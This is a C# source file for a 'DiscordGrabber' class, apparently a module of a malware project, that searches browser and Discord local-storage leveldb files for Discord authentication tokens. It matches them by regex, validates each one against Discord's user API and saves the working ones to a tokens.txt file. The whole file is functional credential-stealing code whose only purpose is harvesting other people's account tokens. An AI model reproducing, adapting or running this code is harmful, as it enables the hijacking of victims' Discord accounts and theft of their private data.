using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Text.RegularExpressions;
using System.Threading.Tasks;

namespace Project_Illumination.Exploits.Programs
{
    internal class DiscordGrabber
    {
        private string[] _paths;
        private Regex _tokenRegex;
        private readonly bool _checkTokens;
        private readonly string _path;

        public DiscordGrabber(bool checkTokens = true, bool mfaOnly = false)
        {
            _checkTokens = checkTokens;
            _tokenRegex = new Regex(mfaOnly ? @"mfa\.[\w-]{84}" : @"mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}", RegexOptions.Compiled);
            _paths = Paths.CHROMIUM_PATHS.Concat(Paths.DISCORD_PATHS).Append(Paths.EDGE_BROWSER).ToArray();
            Directory.CreateDirectory(_path = $@"{Paths.SAVE_PATH}\Programs\Discord");
        }

        public void Run()
        {
            var tokens = new List<string>();
            Parallel.ForEach(_paths, path =>
            {
                var tokensForPath = FindTokensForPath(path);

                if (tokensForPath.Count == 0) return;
                if (_checkTokens) tokensForPath = tokensForPath.Where(IsValidToken).ToList();

                tokensForPath.ForEach(t =>
                {
                    if (!tokens.Contains(t)) tokens.Add(t);
                });

                File.WriteAllText($@"{_path}\tokens.txt", string.Join("\n", tokens));
            });

            Dispose();
        }

        private void Dispose()
        {
            _tokenRegex = null;
            _paths = null;
        }

        private bool IsValidToken(string token)
        {
            var request = (HttpWebRequest)WebRequest.Create("https://discordapp.com/api/v8/users/@me");
            request.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0";
            request.AutomaticDecompression = DecompressionMethods.GZip;
            request.Headers.Add("Authorization", token);
            request.Timeout = 2000;

            try
            {
                using var response = (HttpWebResponse)request.GetResponse();
                return response.StatusCode == HttpStatusCode.OK;
            }
            catch
            {
                return false;
            }
        }

        private List<string> FindTokensForPath(string path)
        {
            var isDiscord = path.ToLower().Contains("discord");
            var directory = path.Contains("Opera Software") || isDiscord ? Paths.ROAMING : Paths.LOCAL;

            path = $@"{directory + path + (!isDiscord ? @"\Default" : "")}\Local Storage\leveldb";

            var tokens = new List<string>();
            if (!Directory.Exists(path)) return tokens;

            var files = Directory.GetFiles(path).Select(Path.GetFileName).Where(fn => fn.EndsWith(".log") || fn.EndsWith(".ldb")).ToArray();
            Parallel.ForEach(files, file =>
            {
                using var stream = new FileStream($"{path}\\{file}", FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                using var reader = new StreamReader(stream);

                tokens.AddRange(from Match match in _tokenRegex.Matches(reader.ReadToEnd()) select match.Value);
            });

            return tokens;
        }
    }
}
